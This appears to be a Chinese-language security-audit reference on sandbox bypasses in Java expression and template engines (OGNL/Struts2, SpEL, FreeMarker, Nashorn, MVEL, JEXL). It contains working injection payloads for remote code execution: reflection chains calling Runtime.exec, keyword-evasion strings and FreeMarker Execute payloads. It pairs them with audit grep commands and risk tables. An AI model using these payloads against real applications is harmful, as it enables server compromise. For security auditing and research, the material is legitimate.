# 表达式/模板注入沙箱绕过技术详解

## 目录

- [1. OGNL 沙箱绕过](#1-ognl-沙箱绕过)
- [2. SpEL 沙箱绕过](#2-spel-沙箱绕过)
- [3. FreeMarker 沙箱绕过](#3-freemarker-沙箱绕过)
- [4. ScriptEngine 沙箱绕过](#4-scriptengine-沙箱绕过)
- [5. MVEL/Aviator/JEXL 沙箱](#5-mvelaviatorjexl-沙箱)
- [6. 沙箱绕过通用技巧](#6-沙箱绕过通用技巧)

---

## 1. OGNL 沙箱绕过

### Struts2 OGNL 沙箱演进史

```
时间线：
2007-2017: 几乎无沙箱，_memberAccess 可写
2017: S2-045 大规模利用，Struts 2.3.34/2.5.13 加入 _memberAccess 限制
2018: S2-057 利用 namespace 绕过
2019: 2.5.20 加入 excludedClasses/excludedPackageNames
2020: 2.5.22 进一步强化
2021: 2.5.26 沙箱重构，增加 OgnlGuard
```

### 绕过技术矩阵

| 沙箱版本 | 绕过方法 | 关键技术 |
|---------|---------|---------|
| ≤ 2.3.34 | `#_memberAccess.allowStaticMethodAccess=true` | 直接配置修改 |
| 2.3.34-2.5.12 | `#_memberAccess.excludedClasses={}` | 清空排除列表 |
| 2.5.13-2.5.16 | `#context['com.opensymphony.xwork2.ActionContext.container']` → `getInstance(OgnlUtil.class)` | 通过容器获取 OgnlUtil |
| 2.5.17-2.5.20 | OgnlUtil → `excludedClasses.clear()` + `excludedPackageNames.clear()` | 清空黑名单 |
| 2.5.20-2.5.22 | 使用 `ognl.DefaultMemberAccess` 替代品 | 替换 MemberAccess |
| ≥ 2.5.26 | OgnlGuard 过滤器链 | 需新 gadget 类 |

### 典型绕过 Payload 结构

```
# 通用模板: 清理限制 → 恢复静态方法访问 → 反射执行

# 第1步: 清理 excludedClasses/excludedPackageNames
(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))
(#ognlUtil.excludedClasses.clear())
(#ognlUtil.excludedPackageNames.clear())

# 第2步: 恢复静态方法访问
(#_memberAccess.allowStaticMethodAccess=true)

# 第3步: 反射调用 Runtime (因为 Runtime 在 excludedClasses 中)
(#cls=@java.lang.Class@forName('java.lang.Runtime'))
(#getRuntime=#cls.getDeclaredMethod('getRuntime'))
(#runtime=#getRuntime.invoke(null))
(#exec=#cls.getDeclaredMethod('exec', @java.lang.Class@forName('[Ljava.lang.String;')))
(#exec.invoke(#runtime, @java.lang.String@split('id')))

# 或使用 ProcessBuilder
(#pb=@java.lang.ProcessBuilder@<init>({'id'}))
(#pb.start())
```

### 审计实战要点

```bash
# 1. 确定 Struts2 版本
grep -r "struts2-core" pom.xml
find . -name "struts2-core-*.jar"

# 2. 检查是否启用了 OGNL 沙箱加强
grep -rn "struts.ognl.allowStaticMethodAccess\|struts.excludedClasses\|struts.excludedPackageNames" --include="*.xml" --include="*.properties"

# 3. 检查是否有自定义 MemberAccess
grep -rn "MemberAccess\|OgnlGuard\|OgnlRuntime.setSecurityManager" --include="*.java"

# 4. 检查 alwaysSelectFullNamespace
grep -rn "alwaysSelectFullNamespace" --include="*.xml"
# 若为 true → S2-057 可利用
```

---

## 2. SpEL 沙箱绕过

### Spring SpEL 安全限制

SpEL 本身没有沙箱，安全性取决于：
1. EvaluationContext 类型（Standard vs Simple）
2. 表达式是否用户可控
3. Spring Security 的表达式限制

### 绕过技巧

#### 绕过 1: 黑名单类名绕过

```java
// 如果 Runtime 被黑名单（仅理论，实际无此限制）
T(java.lang.Runtime).getRuntime().exec("id")

// 使用 ProcessBuilder
new java.lang.ProcessBuilder("id").start()

// 使用反射
T(Class).forName("java.lang.Runtime").getMethod("getRuntime").invoke(null)
```

#### 绕过 2: 字符串拼接绕过关键字检测

```java
T(Class).forName("java.la" + "ng.Ru" + "ntime")
T(org.springframework.util.StringUtils).arrayToCommaDelimitedString(new String[]{"j","a","v","a",".","l","a","n","g",".","R","u","n","t","i","m","e"})
```

#### 绕过 3: Spring 内置工具类

```java
// 使用 Spring 的 Base64 解码加载字节码
T(org.springframework.util.Base64Utils).decode("yv66v...")

// 使用 ClassUtils 获取 ClassLoader
T(org.springframework.util.ClassUtils).getDefaultClassLoader()

// 使用 StreamUtils 读取进程输出
T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())
```

---

## 3. FreeMarker 沙箱绕过

### 沙箱层级

```
FreeMarker 沙箱层次：
L1: Configuration.setNewBuiltinClassResolver(allows_nothing) → 禁用 ?new
L2: Configuration.setAPIBuiltinEnabled(false) → 禁用 ?api
L3: TemplateExceptionHandler → 异常处理
L4: ObjectWrapper (BeansWrapper) → 限制 Java 对象访问
L5: TemplateModel (自定义) → 应用层沙箱
```

### 绕过矩阵

#### 条件: new_builtin_class_resolver=all_resolver (默认)

```freemarker
<#-- RCE 1: Execute (≤ 2.3.30) -->
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

<#-- RCE 2: ObjectConstructor (2.3.31+) -->
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder", "id").start()}

<#-- RCE 3: JdbcRowSetImpl + JNDI -->
${"com.sun.rowset.JdbcRowSetImpl"?new()}
```

#### 条件: new_builtin_class_resolver=safer_resolver

```freemarker
<#-- safer_resolver 有白名单，但仍可能绕过 -->
<#-- 如果白名单中包含以下类 -->
<#-- java.util.HashMap → 无 RCE -->
<#-- java.util.ArrayList → 无 RCE -->
<#-- 但如果任何白名单类有可利用方法 → RCE -->
```

#### 条件: new_builtin_class_resolver=allows_nothing

```freemarker
<#-- ?new 被完全禁用，主要 RCE 链被阻断 -->
<#-- 但仍需检查以下替代攻击面： -->

<#-- ?api 反射 (如果 api_builtin_enabled=true) -->
${someObject?api.getClass().forName("java.lang.Runtime")}

<#-- 自定义指令中的危险操作 -->
<@customDirective ... />

<#-- 如果 expose-spring-macro-helpers=true -->
${springMacroRequestContext.getWebApplicationContext().getBean(...)}
```

### 实战案例: UJCMS 沙箱分析

```
项目: UJCMS CMS
FreeMarker 版本: 2.3.31 (通过 Spring Boot 3.5.10)
配置:
  new_builtin_class_resolver: allows_nothing ✅
  expose-spring-macro-helpers: false ✅
  api_builtin_enabled: 未配置（默认 true）

攻击面分析:
1. ?new 不可用 → Execute/ObjectConstructor RCE 无效
2. springMacroRequestHelper 不可用 → Spring context 反射无效
3. ?api 默认可用 → 若模板中有任何危险对象的引用，可反射

结论:
- ?new 链被彻底阻断 → 主要 RCE 不可行
- ?api 链需前置条件（模板中有 Thread/ClassLoader/Java 对象引用）
- 综合判定: SSTI 不可直接 RCE → 风险 Low
- 但若开发者使用 ?api 的反射能力 → 可能被滥用
```

---

## 4. ScriptEngine 沙箱绕过

### Nashorn 沙箱 (JDK 8-14)

```javascript
// JDK 8 Nashorn 默认可以访问 Java 类
var Runtime = Java.type('java.lang.Runtime');
Runtime.getRuntime().exec('id');

// 绕过 ClassFilter
// 如果设置了 ClassFilter 限制 Java.type
var Thread = Java.type('java.lang.Thread');
var thread = new Thread(function() {
    var Runtime = Java.type('java.lang.Runtime');
    Runtime.getRuntime().exec('id');
});
thread.start();
```

### JDK 15+ (Nashorn 移除)

```
JDK 15+ 移除 Nashorn，但仍可能使用：
- GraalVM JavaScript
- Rhino (Mozilla)
- 第三方 ScriptEngine 实现
```

---

## 5. MVEL/Aviator/JEXL 沙箱

### MVEL

```java
// MVEL 2.x 默认限制了一些操作，但可以绕过
// 通过反射获取 Runtime
MVEL.eval("Runtime.getRuntime().exec('id')");
// 如果 Runtime 被限制
MVEL.eval("Class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')");
```

### Aviator

```java
// Aviator 默认非常安全，禁用了 Java 反射
// 绕过方式: 自定义函数注入
AviatorEvaluator.addFunction(new AbstractFunction() {
    @Override
    public AviatorObject call(Map<String, Object> env, AviatorObject arg) {
        Runtime.getRuntime().exec(arg.getValue(env).toString());
        return null;
    }
});
// 若用户能注册自定义函数 → RCE
```

### JEXL

```java
// JEXL 3.x 相对安全
// 但若 namespace 中有危险函数
JexlEngine jexl = new JexlBuilder().create();
// 默认 namespace 无危险函数
// 但应用可能自定义添加
jexl.setProperty("runtime", Runtime.getRuntime());  // ❌ 应用层错误
```

---

## 6. 沙箱绕过通用技巧

### 技巧 1: 类加载器链

```
大多数沙箱通过黑名单限制类名，但遗漏 ClassLoader：

1. 通过 Thread 获取 ClassLoader
2. 通过 ClassLoader 加载任意类
3. 反射调用目标方法
```

### 技巧 2: 字符串变换绕过关键字匹配

```
常见变换：
- 拼接: "java." + "lang." + "Runtime"
- 大小写: jAvA.lAnG.rUnTiMe (Java 不敏感)
- Unicode 编码
- 反射获取类: Class.forName(new String(new byte[]{...}))
```

### 技巧 3: 利用白名单类

```
如果沙箱使用白名单，检查白名单中每个类是否有危险方法：
- java.util.ProcessBuilder: 直接可执行命令
- javax.script.ScriptEngineManager: 可获取脚本引擎再执行
- javax.xml.transform.TransformerFactory: 可 XXE
- java.net.URL: 可 SSRF
- java.io.File: 可文件操作
```

### 技巧 4: 嵌套表达式

```
# OGNL
${#a=@java.lang.Runtime@getRuntime(), #a.exec('id')}

# SpEL
T(Class).forName(T(Character).toString(74)+'ava.la'+T(Character).toString(110)+'g.Runtime')
```

### 沙箱审计速查表

| 引擎 | 默认沙箱强度 | 关键配置 | 绕过难度 |
|------|------------|---------|---------|
| OGNL/Struts2 2.5.26+ | 🟢 强 | OgnlGuard | 高 |
| OGNL/Struts2 ≤ 2.5.20 | 🔴 弱 | _memberAccess | 低 |
| SpEL | 🔴 极弱 | 无内置沙箱 | 极低 |
| FreeMarker | 🟡 中 | new_builtin_class_resolver | 低-中 |
| Velocity | 🔴 弱 | 无内置沙箱 | 低 |
| Groovy | 🔴 极弱 | CompilerConfiguration | 极低 |
| Thymeleaf | 🟢 强 | 预处理表达式限制 | 高 |
| Aviator | 🟢 强 | 默认禁用 Java 调用 | 高 |
| JEXL 3.x | 🟡 中 | namespace 控制 | 中 |
| MVEL 2.x | 🟡 中-弱 | 限制了一些操作 | 中 |
